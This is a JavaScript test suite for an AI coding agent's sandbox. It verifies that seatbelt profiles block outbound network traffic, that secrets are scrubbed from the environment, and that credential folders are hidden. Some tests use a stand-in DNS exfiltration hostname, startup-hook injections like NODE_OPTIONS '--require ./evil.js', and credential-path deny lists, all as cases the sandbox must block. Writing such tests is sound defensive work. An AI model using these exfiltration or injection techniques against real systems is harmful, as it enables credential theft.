import test from 'node:test';
import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { build } from 'esbuild';
import { mkdtemp } from 'node:fs/promises';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';

const temporary = await mkdtemp(join(tmpdir(), 'glitter-isolation-'));
const outfile = join(temporary, 'isolation.mjs');
await build({ entryPoints: [resolve('packages/glitter-harness/src/isolation.ts')], bundle: true, platform: 'node', format: 'esm', outfile, logLevel: 'silent' });
const {
  filterChildEnv, confinedCwd, approvalAlive, approvalExpiry, approvalExpiryMono, describeIsolation, HOST_QUEUE_LIMIT,
  buildSeatbeltProfile, wrapSandboxedCommand, sandboxBackend, spawnIsolated, terminateTree, credentialRoots, sessionLogRoots, packageCacheRules,
} = await import(pathToFileURL(outfile).href);

test('an offline profile keeps outbound traffic on this Mac, and the default stays online', () => {
  const offline = buildSeatbeltProfile(['/work'], [], false);
  assert.match(offline, /\(deny network-outbound\)/);
  assert.match(offline, /\(allow network-outbound \(remote ip "localhost:\*"\)\)/, 'local dev servers stay reachable');
  assert.doesNotMatch(offline, /remote unix-socket/, 'no blanket allowance for every socket');
  assert.doesNotMatch(buildSeatbeltProfile(['/work']), /network-outbound/, 'online commands are unchanged');
  const roots = credentialRoots('/Users/someone');
  assert.ok(roots.includes('/Users/someone/.aws'));
  assert.ok(roots.includes('/Users/someone/Library/Keychains'));
  // M18: a private key printed by an offline command goes straight into the model's context.
  assert.ok(roots.includes('/Users/someone/.ssh'), 'SSH keys are not readable offline');
  assert.ok(roots.includes('/Users/someone/.gnupg/private-keys-v1.d'));
});

// C2. The system resolver answers any name lookup, so a command with no route
// could still send data out as a hostname. Sockets are allowed only where a
// local tool puts its own, not wherever a daemon listens.
test('an offline profile allows Unix sockets only under writable folders and the GPG agent’s', () => {
  const offline = buildSeatbeltProfile(['/work/repo'], [], false);
  const line = offline.split('\n').find((entry) => entry.startsWith('(allow network-outbound (subpath'));
  assert.ok(line, 'a socket allowance exists');
  for (const folder of ['/work/repo', '/private/tmp', '/private/var/folders', '/var/tmp']) assert.ok(line.includes(`(subpath "${folder}")`), folder);
  assert.ok(line.includes(`${process.env.HOME}/.gnupg`), 'signing through gpg-agent keeps working');
  for (const system of ['/var/run', '/private/var/run', 'mDNSResponder', 'docker.sock', '.docker']) assert.ok(!line.includes(system), `${system} is not allowed`);
  assert.ok(offline.indexOf('(deny network-outbound)') < offline.indexOf(line), 'the allowance narrows the deny, not the reverse');
});

test('the saved threads of every workspace are hidden from sandboxed commands', () => {
  assert.deepEqual(sessionLogRoots({}, '/Users/someone', 'darwin'), [
    '/Users/someone/.glitter/harness',
    '/Users/someone/Library/Application Support/com.glitter.desktop/harness',
  ]);
  assert.deepEqual(sessionLogRoots({ GLITTER_HARNESS_DIR: '/data/h' }, '/Users/someone', 'darwin')[0], '/data/h', 'the folder the app was started with wins');
  const wrapped = wrapSandboxedCommand('/bin/true', [], { extraRoots: ['/work'], backend: 'seatbelt' });
  assert.match(wrapped.args[1], /\(deny file-read-data[^\n]*\/\.glitter\/harness/, 'every sandboxed child is covered, offline or not');
  assert.match(wrapped.args[1], /\(deny file-read-data[^\n]*com\.glitter\.desktop\/harness/);
});

// isolation.ts cannot import the CLI's config without inverting the layers, so it
// repeats the app identifier. This keeps the two from drifting apart.
test('the session folder hidden here is the one the CLI and the app use', async () => {
  const configFile = join(temporary, 'config.mjs');
  await build({ entryPoints: [resolve('packages/glitter-harness/src/cli/config.ts')], bundle: true, platform: 'node', format: 'esm', outfile: configFile, logLevel: 'silent' });
  const { appDataDir } = await import(pathToFileURL(configFile).href);
  const env = { ...process.env };
  delete env.GLITTER_HARNESS_DIR;
  assert.ok(sessionLogRoots(env).includes(join(appDataDir(), 'harness')), 'the app’s default folder is hidden');
});

test('an offline sandbox resolves localhost but no outside name, and refuses system sockets', { skip: sandboxBackend() !== 'seatbelt' }, async () => {
  const { createServer } = await import('node:http');
  const { createServer: unixServer } = await import('node:net');
  const server = createServer((_request, response) => response.end('ok'));
  await new Promise((done) => server.listen(0, '127.0.0.1', done));
  const port = server.address().port;
  const socketPath = join(tmpdir(), `glitter-socket-${process.pid}.sock`);
  const local = unixServer((connection) => connection.end('hi'));
  await new Promise((done) => local.listen(socketPath, done));
  const profile = buildSeatbeltProfile([tmpdir()], [], false);
  const run = (code) => spawnSync('/usr/bin/sandbox-exec', ['-p', profile, process.execPath, '-e', code], { encoding: 'utf8', timeout: 15_000 }).stdout.trim();
  const lookup = (name) => run(`require('dns').lookup(${JSON.stringify(name)}, (error, address) => console.log(error ? error.code : 'resolved'))`);
  const connect = (target) => run(`require('net').connect(${target}).on('connect', () => { console.log('connected'); process.exit(0); }).on('error', (error) => { console.log(error.code); process.exit(0); })`);
  try {
    assert.equal(lookup('example.com'), 'ENOTFOUND', 'an outside name cannot be looked up, so it cannot carry data out');
    assert.equal(lookup('c2VjcmV0.exfil.example.com'), 'ENOTFOUND');
    assert.equal(lookup('localhost'), 'resolved', 'dev servers still find localhost');
    assert.equal(connect(`${port}, 'localhost'`), 'connected', 'and reach it by name');
    assert.equal(connect(JSON.stringify(socketPath)), 'connected', 'a socket a local tool made in temp is reachable');
    assert.equal(connect(JSON.stringify('/var/run/mDNSResponder')), 'EPERM', 'the system resolver is not');
  } finally {
    server.close();
    local.close();
  }
});

test('an offline sandbox cannot read private keys or the saved threads; an online one can read keys', { skip: sandboxBackend() !== 'seatbelt' }, async () => {
  const { mkdtemp, mkdir, writeFile } = await import('node:fs/promises');
  const home = await mkdtemp(join(tmpdir(), 'glitter-fake-home-'));
  await mkdir(join(home, '.ssh'), { recursive: true });
  await mkdir(join(home, '.glitter', 'harness'), { recursive: true });
  await writeFile(join(home, '.ssh', 'id_ed25519'), 'PRIVATE-KEY-MATERIAL');
  await writeFile(join(home, '.glitter', 'harness', 'other-workspace.jsonl'), 'OTHER-WORKSPACES-THREAD');
  const read = (file, denied, network) => spawnSync('/usr/bin/sandbox-exec', ['-p', buildSeatbeltProfile([tmpdir()], denied, network), '/bin/cat', file], { encoding: 'utf8', timeout: 10_000 });
  const denied = [...credentialRoots(home), ...sessionLogRoots({}, home, 'darwin')];
  const key = read(join(home, '.ssh', 'id_ed25519'), denied, false);
  assert.notEqual(key.status, 0);
  assert.doesNotMatch(key.stdout, /PRIVATE-KEY-MATERIAL/);
  const thread = read(join(home, '.glitter', 'harness', 'other-workspace.jsonl'), denied, false);
  assert.notEqual(thread.status, 0);
  assert.doesNotMatch(thread.stdout, /OTHER-WORKSPACES-THREAD/);
  const online = read(join(home, '.ssh', 'id_ed25519'), sessionLogRoots({}, home, 'darwin'), true);
  assert.match(online.stdout, /PRIVATE-KEY-MATERIAL/, 'an approved online command still has its keys (git over ssh)');
});

test('an offline sandbox refuses a remote connection and allows loopback', { skip: sandboxBackend() !== 'seatbelt' }, async () => {
  const { createServer } = await import('node:http');
  const server = createServer((_request, response) => response.end('ok'));
  await new Promise((done) => server.listen(0, '127.0.0.1', done));
  const port = server.address().port;
  const profile = buildSeatbeltProfile([tmpdir()], [], false);
  const probe = (host) => spawnSync('/usr/bin/sandbox-exec', ['-p', profile, process.execPath, '-e', `require('net').connect(${port}, '${host}').on('connect', () => { console.log('connected'); process.exit(0); }).on('error', (error) => { console.log(error.code); process.exit(0); })`], { encoding: 'utf8', timeout: 10_000 });
  assert.equal(probe('127.0.0.1').stdout.trim(), 'connected', 'loopback is allowed');
  // A documentation-range address: refused by the sandbox before any packet leaves.
  assert.equal(probe('192.0.2.1').stdout.trim(), 'EPERM');
  server.close();
});

test('child env keeps PATH/HOME and strips every secret', () => {
  const env = filterChildEnv({
    PATH: '/usr/bin',
    HOME: '/Users/me',
    AWS_SECRET_ACCESS_KEY: 'aws-secret',
    GITHUB_TOKEN: 'ghp_secret',
    NODE_OPTIONS: '--require ./evil.js',
    OPENAI_API_KEY: 'openai-key',
  });
  assert.equal(env.PATH, '/usr/bin');
  assert.equal(env.HOME, '/Users/me');
  for (const key of ['AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN', 'NODE_OPTIONS', 'OPENAI_API_KEY']) assert.equal(key in env, false, key);
});

test('the native and Harness inherited-environment allowlists agree', () => {
  const native = readFileSync('apps/desktop/src-tauri/src/process.rs', 'utf8').match(/const BASE_ENV: &[\s\S]*?= &\[([\s\S]*?)\];/);
  assert.ok(native, 'native allowlist exists');
  const harness = readFileSync('packages/glitter-harness/src/isolation.ts', 'utf8').match(/BASE_ENV_KEYS = new Set\(\[([\s\S]*?)\]\)/);
  assert.ok(harness, 'Harness allowlist exists');
  const keys = (source) => [...source.matchAll(/"([A-Z_a-z]+)"/g)].map((match) => match[1]).sort();
  assert.deepEqual(keys(harness[1]), keys(native[1]), 'a setting must survive both environment scrubs');
});

test('F2.3: child env preserves toolchain settings through a real process without inheriting secrets or startup hooks', async () => {
  const toolchains = {
    JAVA_HOME: '/toolchains/jdk', JDK_HOME: '/toolchains/jdk',
    CARGO_HOME: '/toolchains/cargo', RUSTUP_HOME: '/toolchains/rustup',
    GOPATH: '/toolchains/go', GOROOT: '/toolchains/go-sdk',
    PYENV_ROOT: '/toolchains/pyenv', PYENV_VERSION: '3.13.2',
    RBENV_ROOT: '/toolchains/rbenv', RBENV_VERSION: '3.4.1',
    BUN_INSTALL: '/toolchains/bun', NVM_DIR: '/toolchains/nvm',
    VOLTA_HOME: '/toolchains/volta', ASDF_DATA_DIR: '/toolchains/asdf',
    MISE_DATA_DIR: '/toolchains/mise', VIRTUAL_ENV: '/toolchains/venv', CONDA_PREFIX: '/toolchains/conda',
  };
  const secrets = {
    OPENAI_API_KEY: 'provider-secret', AWS_SECRET_ACCESS_KEY: 'cloud-secret',
    GITHUB_TOKEN: 'github-secret', NPM_TOKEN: 'registry-secret',
    JAVA_TOOL_OPTIONS: '-javaagent:untrusted.jar', PYTHONPATH: '/untrusted',
    RUBYOPT: '-runtrusted', BASH_ENV: '/untrusted/startup', NODE_OPTIONS: '--require untrusted',
  };
  const { child } = spawnIsolated(process.execPath, ['-e', 'process.stdout.write(JSON.stringify(process.env))'], {
    env: { ...toolchains, ...secrets, PATH: process.env.PATH, HOME: process.env.HOME },
    workspace: temporary,
    // This test covers the environment; the real seatbelt suite covers confinement.
    sandbox: false,
  });
  let output = '';
  let errors = '';
  child.stdout.on('data', (part) => { output += part; });
  child.stderr.on('data', (part) => { errors += part; });
  const code = await new Promise((done, reject) => { child.once('error', reject); child.once('close', done); });
  assert.equal(code, 0, errors);
  const actual = JSON.parse(output);
  for (const [key, value] of Object.entries(toolchains)) assert.equal(actual[key], value, `${key} survives the scrub`);
  for (const key of Object.keys(secrets)) assert.equal(key in actual, false, `${key} stays out`);
});

test('confined cwd never falls back to the home directory', () => {
  const cwd = confinedCwd('/definitely-missing-workspace');
  assert.notEqual(cwd, process.env.HOME);
  assert.ok(cwd.length > 0);
});

test('approval expiry rejects stale decisions', () => {
  assert.equal(approvalExpiry(1_000, 10), 1_010);
  const expires = approvalExpiryMono(1_000, 10);
  assert.equal(approvalAlive(expires, 1_009), true);
  assert.equal(approvalAlive(expires, 1_011), false);
});

test('isolation report requires consent when the OS sandbox is unavailable', () => {
  const report = describeIsolation('/tmp', false);
  assert.equal(report.env, 'minimal');
  assert.equal(report.osSandbox, 'unavailable');
  assert.equal(report.consentRequired, true);
  assert.equal(HOST_QUEUE_LIMIT, 16);
  const enforced = describeIsolation('/tmp', true);
  assert.equal(enforced.osSandbox, 'enforced');
  assert.equal(enforced.consentRequired, false);
});

test('the seatbelt stays write-scoped to the workspace, temp and caches', () => {
  const profile = buildSeatbeltProfile(['/work/repo']);
  assert.match(profile, /\(deny file-write\*\)/);
  assert.match(profile, /subpath "\/work\/repo"/);
  assert.match(profile, /subpath "\/tmp"\)/);
  assert.match(profile, /Library\/Caches/);
  assert.doesNotMatch(profile, /subpath "[^"]*\/\.config"/, 'does not grant all of ~/.config');
  assert.doesNotMatch(profile, /subpath "[^"]*\/Application Support"/, 'does not grant all of ~/Library/Application Support');
  assert.match(profile, /\(allow default\)/);
});

test('F2.1: package caches are writable without granting their configuration or toolchain folders', () => {
  const profile = buildSeatbeltProfile(['/work/repo']);
  const writes = profile.split('\n').filter((line) => line.startsWith('(allow file-write* ')).join('\n');
  const home = realpathSync(homedir());
  for (const cache of [
    '.npm', '.cargo/registry', '.cargo/git', '.gradle/caches', '.gradle/daemon',
    '.gradle/native', '.gradle/notifications', '.gradle/wrapper', '.m2/repository',
    'go/pkg', '.bun/install/cache', '.yarn/berry/cache',
  ]) assert.ok(writes.includes(`(subpath "${join(home, cache)}")`), `${cache} is writable`);
  for (const folder of ['.cargo', '.gradle', '.m2', 'go', '.bun', '.bun/install', '.yarn', '.yarn/berry']) {
    assert.ok(!writes.includes(`(subpath "${join(home, folder)}")`), `${folder} is not wholly writable`);
    assert.ok(profile.includes(`(literal "${join(home, folder)}")`), `${folder} can be created on first use`);
  }
  for (const path of ['.npmrc', '.cargo/bin', '.cargo/config.toml', '.cargo/credentials.toml', '.gradle/gradle.properties', '.m2/settings.xml', 'go/bin']) {
    assert.ok(!writes.includes(`(subpath "${join(home, path)}")`), `${path} is not granted`);
  }
  for (const file of ['.package-cache', '.package-cache-mutate', '.global-cache', '.global-cache-journal', '.global-cache-shm', '.global-cache-wal']) {
    assert.ok(writes.includes(`(literal "${join(home, '.cargo', file)}")`), `${file} is an exact file allowance`);
  }
});

test('F2.1: cache rules never grant a symlink target or the right to replace a toolchain parent', () => {
  const root = mkdtempSync(join(tmpdir(), 'glitter-cache-rules-'));
  const fakeHome = join(root, 'home');
  const outside = join(root, 'outside');
  mkdirSync(fakeHome);
  mkdirSync(outside);
  symlinkSync(outside, join(fakeHome, '.npm'));
  symlinkSync(outside, join(fakeHome, '.cargo'));
  try {
    const rules = packageCacheRules(fakeHome);
    assert.ok(!rules.includes(realpathSync(outside)), 'a cache or its parent must not grant a symlink target');
    const create = rules.split('\n').find((line) => line.startsWith('(allow file-write-create '));
    assert.ok(create.includes(`(require-all (literal "${join(realpathSync(fakeHome), '.cargo')}") (vnode-type DIRECTORY))`));
    assert.doesNotMatch(rules, /allow file-write-unlink/, 'parent folders cannot be moved or replaced');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('C1: the seatbelt denies writes to the workspace git control files after allowing the workspace', () => {
  const profile = buildSeatbeltProfile(['/work/repo']);
  const allow = profile.indexOf('(allow file-write* ');
  const deny = profile.indexOf('(deny file-write* (literal "/work/repo/.git")');
  assert.ok(allow >= 0 && deny > allow, 'the deny comes after the allow, so it wins');
  for (const path of ['/work/repo/.git/config', '/work/repo/.git/config.worktree', '/work/repo/.git/commondir']) {
    assert.ok(profile.includes(`(literal "${path}")`), path);
  }
  assert.ok(profile.includes('(subpath "/work/repo/.git/hooks")'));
  assert.ok(profile.includes(String.raw`(regex #"^\/work\/repo\/\.git\/worktrees/[^/]+/(config\.worktree|commondir|gitdir)$")`), profile);
  assert.doesNotMatch(profile, /\/tmp\/\.git/, 'temp and cache roots get no git rules');
  assert.doesNotMatch(buildSeatbeltProfile([]), /\.git/);
});

test('H8: the seatbelt denies protected paths after the workspace allow, gives node_modules back, and keeps git rules last', () => {
  const profile = buildSeatbeltProfile(['/work/repo']);
  const allow = profile.indexOf('(allow file-write* ');
  const protectedDeny = profile.indexOf(String.raw`(deny file-write* (regex #"^\/work\/repo/`);
  const modules = profile.indexOf('node_modules/');
  const git = profile.indexOf('(deny file-write* (literal "/work/repo/.git")');
  assert.ok(allow >= 0 && allow < protectedDeny && protectedDeny < modules && modules < git, profile);
  assert.ok(profile.includes(String.raw`(regex #"^\/work\/repo/(.*/)?AGENTS\.md$")`), profile);
  assert.ok(profile.includes(String.raw`(regex #"^\/work\/repo/\.glitter(/.*)?$")`), profile);
  assert.ok(profile.includes(String.raw`(regex #"^\/work\/repo/(.*/)?\.env\.[^/]*$")`), profile);
  const custom = buildSeatbeltProfile(['/work/repo'], [], true, ['config/secrets/**']);
  assert.doesNotMatch(custom, /AGENTS/, 'the user can change the set');
  assert.ok(custom.includes(String.raw`(regex #"^\/work\/repo/config$")`), 'a parent folder cannot be renamed away');
  assert.doesNotMatch(buildSeatbeltProfile([]), /node_modules/, 'no workspace, no protected rules');
});

test('suggestion seatbelt denies reading file contents in the workspace and still allows a file outside it', () => {
  const profile = buildSeatbeltProfile([], ['/work/repo']);
  assert.match(profile, /deny file-read-data/);
  assert.match(profile, /subpath "\/work\/repo"/);
  assert.doesNotMatch(buildSeatbeltProfile(['/work/repo']), /file-read-data/);
  assert.doesNotMatch(buildSeatbeltProfile([], ['/', tmpdir()]), /file-read-data/, 'never hides the root or temp');
  if (process.platform !== 'darwin' || !existsSync('/usr/bin/sandbox-exec')) return;
  const root = mkdtempSync(join(tmpdir(), 'glitter-deny-'));
  const secret = join(root, 'secret.txt');
  try {
    writeFileSync(secret, 'secret-contents');
    const denied = buildSeatbeltProfile([], [root]);
    const read = spawnSync('/usr/bin/sandbox-exec', ['-p', denied, '/bin/cat', secret], { encoding: 'utf8', timeout: 8000 });
    if (read.status !== 0 && /sandbox_apply: Operation not permitted/.test(read.stderr ?? '')) return;
    assert.notEqual(read.status, 0, read.stderr);
    assert.doesNotMatch(read.stdout ?? '', /secret-contents/);
    const outside = spawnSync('/usr/bin/sandbox-exec', ['-p', denied, '/bin/cat', '/etc/hosts'], { encoding: 'utf8', timeout: 8000 });
    assert.equal(outside.status, 0, outside.stderr);
    assert.match(outside.stdout ?? '', /localhost/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('wrap uses the platform sandbox and leaves the command arguments intact', () => {
  const wrapped = wrapSandboxedCommand('/fake/tool', ['serve', '--port', '1'], { extraRoots: ['/work'], backend: sandboxBackend() });
  const at = wrapped.args.lastIndexOf('serve');
  assert.deepEqual(wrapped.args.slice(at), ['serve', '--port', '1']);
  if (sandboxBackend() === 'none') {
    assert.equal(wrapped.sandboxed, false);
    assert.equal(wrapped.command, '/fake/tool');
  } else {
    assert.equal(wrapped.sandboxed, true);
    assert.notEqual(wrapped.command, '/fake/tool');
    assert.ok(wrapped.args.includes('/fake/tool'));
  }
});

test('a sandbox spawn error never retries the command without the sandbox', { skip: sandboxBackend() !== 'seatbelt' }, async () => {
  const work = mkdtempSync(join(tmpdir(), 'glitter-spawn-failure-'));
  const marker = join(work, 'ran-unsandboxed');
  let unexpectedChild;
  let failure;
  try {
    // The invalid workspace makes the generated sandbox profile invalid for
    // spawn, while cwd and the command remain valid if retried on their own.
    try {
      unexpectedChild = spawnIsolated(process.execPath, ['-e', `require('fs').writeFileSync(${JSON.stringify(marker)}, 'ran')`], {
        workspace: 'invalid\0workspace', cwd: work,
      }).child;
    } catch (error) {
      failure = error;
    }
    if (unexpectedChild) await new Promise((done) => unexpectedChild.once('close', done));
    assert.ok(failure, 'starting the sandbox must fail instead of falling back');
    assert.match(failure.message, /sandbox/i);
    assert.equal(existsSync(marker), false, 'the original command must not run');
  } finally {
    rmSync(work, { recursive: true, force: true });
  }
});

test('terminating an already-exited child settles immediately', async () => {
  const child = spawn(process.execPath, ['-e', 'process.exit(0)'], { stdio: ['pipe', 'pipe', 'pipe'] });
  await new Promise((resolve) => child.once('exit', resolve));
  const result = await Promise.race([
    terminateTree(child, 50),
    new Promise((_, reject) => setTimeout(() => reject(new Error('terminateTree stayed pending')), 250)),
  ]);
  assert.equal(result.code, 0);
});

test('terminateTree kills stubborn descendants after the leader exits', async () => {
  for (const alreadyExited of [false, true]) {
    const work = mkdtempSync(join(tmpdir(), 'glitter-tree-'));
    const parentPath = join(work, 'parent.cjs');
    const grandchildPath = join(work, 'grandchild.cjs');
    const readyPath = join(work, 'ready');
    const pidPath = join(work, 'pid');
    const termPath = join(work, 'term');
    writeFileSync(grandchildPath, `
      const fs = require('fs');
      process.on('SIGTERM', () => { fs.writeFileSync(${JSON.stringify(termPath)}, 'term'); });
      fs.writeFileSync(${JSON.stringify(pidPath)}, String(process.pid));
      setInterval(() => {}, 1000);
    `);
    writeFileSync(parentPath, `
      const fs = require('fs');
      const { spawn } = require('child_process');
      const child = spawn(process.execPath, [${JSON.stringify(grandchildPath)}], { stdio: 'ignore' });
      process.on('SIGTERM', () => process.exit(0));
      fs.writeFileSync(${JSON.stringify(readyPath)}, String(child.pid));
      setInterval(() => {}, 1000);
    `);
    const child = spawn(process.execPath, [parentPath], { detached: true, stdio: ['pipe', 'ignore', 'ignore'] });
    let grandchildPid;
    try {
      const waitFor = async (predicate, label, budget = 3000) => {
        for (let waited = 0; waited < budget; waited += 25) {
          if (predicate()) return;
          await new Promise((resolve) => setTimeout(resolve, 25));
        }
        throw new Error(`Timed out waiting for ${label}`);
      };
      await waitFor(() => existsSync(readyPath) && existsSync(pidPath), 'fixture readiness');
      grandchildPid = Number(readFileSync(pidPath, 'utf8'));
      const alive = () => { try { process.kill(grandchildPid, 0); return true; } catch { return false; } };
      if (alreadyExited) await new Promise((resolve) => { child.once('exit', resolve); child.kill('SIGTERM'); });
      const result = await Promise.race([
        terminateTree(child, 60),
        new Promise((_, reject) => setTimeout(() => reject(new Error('terminateTree stayed pending')), 2000)),
      ]);
      assert.equal(result.code, 0, `alreadyExited=${alreadyExited}`);
      assert.equal(existsSync(termPath), true, 'the descendant received TERM but stayed alive');
      await waitFor(() => !alive(), 'grandchild death after leader exit');
    } finally {
      try { process.kill(-child.pid, 'SIGKILL'); } catch { /* group already gone */ }
      if (grandchildPid) { try { process.kill(grandchildPid, 'SIGKILL'); } catch { /* already gone */ } }
      rmSync(work, { recursive: true, force: true });
    }
  }
});

test('a seatbelt profile parses and confines writes', () => {
  if (process.platform !== 'darwin' || !existsSync('/usr/bin/sandbox-exec')) return;
  const root = join(tmpdir(), `glitter-sb-${process.pid}`);
  const allowed = join(root, 'allowed');
  const blocked = join(root, 'blocked');
  mkdirSync(allowed, { recursive: true });
  mkdirSync(blocked, { recursive: true });
  // macOS seatbelt matches the canonical path; /var is a symlink to /private/var.
  const allowedReal = realpathSync(allowed);
  const blockedReal = realpathSync(blocked);
  const profile = `(version 1)\n(allow default)\n(deny file-write*)\n(allow file-write* (subpath "${allowedReal}"))\n`;
  const write = (path) => spawnSync('/usr/bin/sandbox-exec', ['-p', profile, '/bin/sh', '-c', `echo ok > ${JSON.stringify(join(path, 'probe'))}`], { timeout: 8000, encoding: 'utf8' });
  try {
    const inside = write(allowed);
    if (inside.status !== 0 && /sandbox_apply: Operation not permitted/.test(inside.stderr ?? '')) return;
    assert.equal(inside.status, 0, inside.stderr);
    assert.equal(existsSync(join(allowed, 'probe')), true);
    const outside = write(blocked);
    assert.notEqual(outside.status, 0);
    assert.equal(existsSync(join(blocked, 'probe')), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// F1.2 / M23. A SIGKILL of the agent skips every exit handler, and detached
// shells would run on with no thread to show them.
test('a background shell is killed when the agent process dies uncleanly', async () => {
  const bundled = join(temporary, 'shells.mjs');
  await build({ entryPoints: [resolve('packages/glitter-harness/src/harness/shells.ts')], bundle: true, platform: 'node', format: 'esm', outfile: bundled, logLevel: 'silent' });
  const driver = join(temporary, 'driver.mjs');
  writeFileSync(driver, `
import { spawn } from 'node:child_process';
import { startShell } from ${JSON.stringify(pathToFileURL(bundled).href)};
const shell = startShell('s', 'sleep 300', () => spawn('/bin/sh', ['-c', 'sleep 300'], { detached: true, stdio: ['pipe', 'pipe', 'pipe'] }));
console.log(shell.child.pid);
setInterval(() => {}, 1000);
`);
  const agent = spawn(process.execPath, [driver], { stdio: ['ignore', 'pipe', 'inherit'] });
  const group = await new Promise((done, fail) => { agent.stdout.once('data', (chunk) => done(Number(String(chunk).trim()))); agent.once('error', fail); });
  const alive = () => { try { process.kill(-group, 0); return true; } catch { return false; } };
  try {
    assert.ok(alive(), 'the shell is running while the agent lives');
    agent.kill('SIGKILL');
    for (let waited = 0; waited < 5000 && alive(); waited += 50) await new Promise((done) => setTimeout(done, 50));
    assert.equal(alive(), false, 'the watchdog killed the shell\'s process group');
  } finally {
    try { process.kill(-group, 'SIGKILL'); } catch { /* already gone */ }
    agent.kill('SIGKILL');
  }
});
